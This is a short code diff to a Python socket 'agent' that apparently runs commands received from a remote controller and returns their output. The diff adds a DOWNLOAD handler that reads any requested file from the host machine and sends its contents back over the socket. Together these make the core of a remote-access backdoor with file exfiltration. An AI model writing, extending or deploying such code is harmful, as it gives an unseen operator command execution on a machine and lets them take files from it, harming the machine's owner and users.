@@ -1,3 +1,4 @@
+import os
 import socket
 import subprocess
 import platform
@@ -49,6 +50,15 @@ def main():
 
                 output = execute_command(command)
                 agent_socket.send(output.encode())
+            elif data.startswith("DOWNLOAD:"):
+                file_name = data[len("DOWNLOAD:"):]
+                if os.path.exists(file_name):
+                    with open(file_name, "rb") as f:
+                        file_data = f.read()
+                        agent_socket.send("FILE:".encode())
+                        agent_socket.send(file_data)
+                else:
+                    agent_socket.send(f"File not found: '{file_name}'".encode())
             else:
                 output = save_received_file(data, "received_file")
                 agent_socket.send(output.encode())
